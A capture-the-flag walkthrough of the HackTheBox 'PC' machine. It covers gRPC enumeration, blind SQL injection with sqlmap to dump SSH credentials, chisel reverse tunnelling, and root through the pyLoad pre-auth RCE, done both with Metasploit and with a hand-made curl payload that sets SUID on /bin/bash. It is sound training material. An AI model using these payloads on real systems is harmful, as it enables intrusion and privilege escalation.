<h2> Target: PC 10.10.11.214 </h2>

<b>Initial Access: </b><br>
Step 1: nmap -Pn 10.10.11.214 --min-rate=5000 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ',' <br>
Nmap shows open ports 22 and 50051

Step 2: Enumerate these open ports further with nmap: nmap -Pn 10.10.11.214 --min-rate=5000 -p 22,50051 -sC -sV -oN nmap-pc 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/aeec2822-38e3-4f4f-969e-3de761d3d880)

* To give the target ip address a domain name go into the file /etc/hosts and enter:  10.10.11.214 pc.htb

Step 3: Google search ‘port 50051 exploit’:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/a92c9a46-1073-426c-823c-89cf1599b3c7) 
 
Reading some articles from the ‘search results’ we find that port 50051 uses gRPC and has an interesting vulnerability.  Based on a few articles found in the ‘search results’ we can perform a number of commands using ‘grpcurl’ and ‘grpcui’.  

Step 4: Using ‘grpcurl’, check the available services this gRPC server is offering: grpcurl -plaintext pc.htb:50051 list  

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/73cebf46-7524-4c8e-ad63-c4300bef5ce9) 
 
Step 6: Using ‘grpcui’, initiate a UI portal: grpcui -plaintext pc.htb:50051 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/98a51c9d-ea1d-4ab9-8a5e-9e703205036b) 

Navigate to the ip address and port given in the output from ‘grpcui’:  http://127.0.0.1:33317

Step 7: Log in using weak credentials of username ‘admin’ and password ‘admin’: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/99c9536b-8a22-46d6-b9a5-9a11311507ac)
 
After successful login, we get an id number and token: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/918b1438-a28b-4708-a079-5d254be550ec) 
 
Step 8: In the drop down ‘Method name’ at the top, switch it from ‘LoginUser’ to ‘getinfo’ and add into the ‘Request Metadata’ section the token and id values:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/be70e733-137f-4e0b-ab2c-219f8a9510bd) 

Step 9: Capture the ‘getinfo’ request in burpsuite:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/c9c02146-f7e0-4862-87bf-502bf93815c1) 
 
Using the ‘getinfo’ burpsuite capture, replace the ‘id’ number with a different number:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/7fe68472-3446-49f8-969f-f1381d25f048) 
  
The response shows an error in the ‘message’.  But if we add ‘or 1=1’ to the incorrect id value then the ‘message’ returns no error:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/90f5ecac-e6ae-4e58-9949-6c2effe101eb)
 
This indicates a blind boolean sql injection.  Copy the burp post request into a file (we will call the filename ‘burp’) and make sure the ‘id’ value in the copied file is just a number (we don't want the sql injection in the copied file).    

Step 10: Check for sql injection using sqlmap: sqlmap -r burp --batch --risk 3 --level 3 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/3aadc48c-2d52-432f-906c-cce20bea037a)

Sqlmap shows that the ‘id’ value is vulnerable to sql injection.

Step 11: Dump the database contents using sqlmap: sqlmap -r burp --batch --risk 3 --level 3 --dbms sqlite –tables 

 ![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/085b0013-ae8f-41ca-a218-7d45e3e9e028)

sqlmap -r burp --batch --risk 3 --level 3 --dbms sqlite --tables -T accounts --columns

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/ece7f90c-144d-46b5-9c70-bce98a236200)

sqlmap -r burp --batch --risk 3 --level 3 --dbms sqlite --tables -T accounts --columns -C username,password –dump 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/b6356df4-1d9e-45b1-9aaf-549faee474ed)

Step 12: Try using the dumped credentials to log into ssh:  ssh sau@pc.htb → enter password ‘HereIsYourPassWord1431’ when prompted.  

It worked, we successfully logged into user sau.  We can get the flag in /home/sau/user.txt.
_______________________________________________________________________
<b>Privilege Escalation: </b><br>
Step 1: Run command netstat -ln: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/5caa7a4b-ba83-40b8-8b13-9570a9f79fa6)
  
We find port 8000 is available only from 127.0.0.1.  

Step 2: Use chisel to perform dynamic port forwarding so that we can access port 8000 from our pc.  First, set up chisel server on our local pc: chisel server -p 1111 --reverse <br>
Next, set up the chisel client on the target pc: chisel client 10.10.14.19:1111 R:2222:socks

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/640567c5-c1d1-48a3-9a6e-bfeff0f365dd)
 
Step 3: In order to navigate to 127.0.0.1:8000 on our local browser we need to configure the browser to go through the port forward we created with chisel.  To do this, open foxyproxy and click on ‘Add’:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/5c18cca5-bad7-453e-a196-674529d511ba)
 
Next, enter the details in foxyproxy that we used in chisel:
 
![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/e0795043-ac19-475a-90c7-f1a3ab50a5d0)

Step 4: Using our browser, navigate to http://127.0.0.1:8000:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/d013524d-d229-408d-ae58-2b645dcd4c89)
 
We find a website that uses ‘pyLoad’.  

Step 5: Google search ‘pyload exploit’ to see if there are any known vulnerabilities:


![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/ae626bd1-147d-451f-be6c-2bb16867ef9d) 

We find that there is a known pre-auth RCE for pyLoad.  

Step 6:  Open metatsploit: msfconsole -q

Step 7: Find the pyload exploit in metasploit: search pyload

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/4fb60a7b-52d2-41b4-b8d5-54197ee4ee5d) 

Select the pyload exploit: use 0

Step 8:  Set up the proper options in metasploit using the following commands: <br>
Set proxies socks5:127.0.0.1:2222 <br>
set rhosts 127.0.0.1 <br>
set rport 8000 <br>
set lhost <enter_your_ip> <br>
set lport <enter_port_number> 
 



![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/6ea53dcc-6491-4ffe-9ba5-91daa5538296)  

Step 9: Run the exploit: run

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/a8d2cea9-a625-443c-99a9-ea297e8ba8bf)
 
We have shell as root.  We can get the flag in /root/root.txt.  

_________________________________________________________________________________________

<b>Privilege Escalation Without Metasploit:</b><br>
Step 1: In order to navigate to 127.0.0.1:8000 on our local pc terminal we need to configure the command in terminal to go through the port forward we created with chisel.   To do this, we will use proxychains.  Open the file /etc/proxychains.conf and enter in the last line: socks5 127.0.0.1 2222

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/9a1eea42-69d1-4bec-8893-94144595e862)

Step 2: Use the command: proxychains curl -s -k -X POST http://127.0.0.1:8000/flash/addcrypted2 --data 'package=xxx&crypted=AAAA&jk=pyimport os;os.system("chmod 4755 /bin/bash");f=function f2(){};&passwords=aaaa'

Before sending the command, url encode pyimport os;os.system("chmod 4755 /bin/bash")  → %70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%34%37%35%35%20%2f%62%69%6e%2f%62%61%73%68%22%29

Step 3: Send the command: proxychains curl -s -k -X POST http://127.0.0.1:8000/flash/addcrypted2 --data 'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%34%37%35%35%20%2f%62%69%6e%2f%62%61%73%68%22%29;f=function f2(){};&passwords=aaaa'

Step 4: On the target shell check if the /bin/bash binary permissions changed to suid: ls -al /bin/bash

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/2197df95-0bf9-4fdc-b86a-319e2c632210)
 
We see the /bin/bash now has suid permissions.  

Step 4:  On the target shell run: /bin/bash -p. <br>
We have shell as root.  
